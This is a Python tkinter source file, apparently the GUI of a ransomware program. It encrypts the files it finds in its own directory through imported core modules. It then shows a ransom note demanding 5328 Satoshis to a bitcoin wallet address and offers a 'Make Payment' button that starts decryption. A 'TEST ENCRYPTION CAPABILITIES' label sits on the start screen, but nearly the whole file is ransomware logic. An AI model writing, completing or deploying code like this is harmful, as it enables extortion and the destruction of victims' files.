import tkinter as tk
import logging
import sys
import os
from tkinter import ttk 
from core.encrypt_files import start_encryption
from core.decrypt_files import start_decryption
from core.comms.bitcoin_address import get_bitcoin_wallet_address
from core.utils.file_ops import get_files_to_be_encrypted

logger = logging.getLogger()

def encrypt_button_handler():
    logger.info("ENCRYPTION STARTED")
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__name__))

    list_of_files_to_be_encrypted = get_files_to_be_encrypted(application_path)
    start_encryption(list_of_files_to_be_encrypted)
    logger.info("ENCRYPTION DONE")


def decrypt_button_handler():
    try:
        logger.info("DECRYPTION STARTED")
        start_decryption()
        logger.info("DECRYPTION DONE")
    except Exception as err:
        return "Oops!! Something is wrong. Try again after sometime"


def get_payment_details():
    try:
        return f"YOUR FILES HAVE BEEN ENCRYPTED.\nYou need to pay 5328 Satoshis to {get_bitcoin_wallet_address()}.\n Google how to buy bitcoins and send it to the wallet addrress mentioned above."
    except Exception as err:
        return "Oops!! Something is wrong. Try again after sometime"
   
   
class tkinterApp(tk.Tk): 
      
    def __init__(self, *args, **kwargs):  
        tk.Tk.__init__(self, *args, **kwargs) 

        self.container = tk.Frame(self)   
        self.container.pack(side = "top", fill = "both", expand = True)  
        self.show_frame(StartPage) 
   
    def show_frame(self, cont): 
        frame = cont(self.container, self) 
        frame.grid(row = 0, column = 0, sticky ="nsew") 
        frame.tkraise() 
   
   
class StartPage(tk.Frame): 
    def __init__(self, parent, controller):  
        tk.Frame.__init__(self, parent)    
        label = ttk.Label(self, text = "\t\t\tTEST ENCRYPTION CAPABILITIES\t\t\t\n\n\n\n\n") 
        label.pack(side=tk.TOP)

        encrypt_button = ttk.Button(self, text="Encrypt", command =lambda:[encrypt_button_handler(), controller.show_frame(Payment_Page)] ) 
        encrypt_button.pack(side=tk.BOTTOM) 

   
class Payment_Page(tk.Frame):    
    def __init__(self, parent, controller): 
        tk.Frame.__init__(self, parent) 
        label = ttk.Label(self, text = get_payment_details()) 
        label.pack(side=tk.TOP)
   
        payment_button = ttk.Button(self, text ="Make Payment", command = lambda: [decrypt_button_handler(), controller.show_frame(Final_Page)]) 
        payment_button.pack(side=tk.BOTTOM)


class Final_Page(tk.Frame):    
    def __init__(self, parent, controller): 
        tk.Frame.__init__(self, parent) 
        label = ttk.Label(self, text = "YOUR FILES HAVE BEEN SUCCESSFULLY DECRYPTED") 
        label.pack(side=tk.TOP)    